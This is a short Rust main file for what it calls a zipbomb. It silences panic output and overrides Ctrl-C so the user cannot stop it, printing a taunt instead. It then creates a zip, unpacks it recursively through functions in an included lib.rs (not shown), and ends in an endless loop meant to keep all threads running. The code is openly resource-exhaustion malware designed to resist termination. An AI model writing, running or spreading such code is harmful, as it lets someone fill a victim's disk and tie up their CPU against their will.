include!("lib.rs");
use std::panic;
use std::process;

fn main() {
    //supress panic messages
    panic::set_hook(Box::new(|_| {}));
    ctrlc::set_handler(|| println!("Bro thought he could stop the zipbomb 😭")).expect("");
    let _ = create_zip().unwrap_or_else(|_| {
        process::exit(1);
    });
    recursive_unzip();
    //force all threads to run forever
    loop {}
}
